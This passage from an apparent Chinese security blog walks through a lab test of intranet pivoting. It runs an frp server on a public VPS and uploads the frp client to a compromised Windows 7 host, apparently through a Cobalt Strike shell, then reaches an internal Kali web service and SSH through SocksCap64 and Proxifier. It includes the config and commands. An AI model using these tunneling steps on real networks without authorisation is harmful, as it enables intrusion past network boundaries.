+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>内网网段：<br>win7 192.168.111.2<br>kali 192.168.111.3 （有Web服务，仅内网访问）</p>
+<p>模拟公网网段：<br>win7 192.168.10.19（桥接）</p>
+<p>实验的时候需要把物理机中自定义的内网网段的网卡禁用掉。</p>
+<p>将编译后的frps_linux_386上传到公网VPS中，创建frps.ini文件，写入</p>
+<pre><code>[common]
+bind_port = 9998  #自定义与客户端要连接的端口</code></pre><p>随后载入该配置文件启动</p>
+<pre><code>./frps_linux_386 -c frps.ini</code></pre><p><img src="/images/13/11.png" alt></p>
+<p>服务端已经成功启动，我们在靶机win7上传我们编译过后的frpc_windows_386.exe.<br><img src="/images/13/12.png" alt></p>
+<p>然后通过cmd命令行指定ip和端口进行连接。当然，上传之后直接在cs中执行shell命令也可。<br><img src="/images/13/13.png" alt></p>
+<p>在本地通过SocksCap64，Proxifier代理工具连接。<br><img src="/images/13/14.png" alt><br><img src="/images/13/15.png" alt></p>
+<p>连接成功，如果不使用代理服务器进行访问。<br><img src="/images/13/16.png" alt></p>
+<p>使用SocksCap64代理后进行访问<br><img src="/images/13/17.png" alt></p>
+<p>成功访问了内网kali的Web服务，ssh服务也可以连上。</p>
+<p>关闭进程</p>
+<pre><code>shell taskkill /f /t /im frpc_windows_386.exe</code></pre><h3 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h3><p>虽然其他服务都能够正常的访问，但是却Ping不通，不知道是自己环境的问题还是ICMP协议通过代理后会有什么变化的问题。</p>
+<p>临时解决：<br>    虽然无法ping，但是可以直接通过CS拿下的机器进行信息收集等工作，感觉代理后Ping的通内网并不是刚需。</p>
+
       
        
     </div>
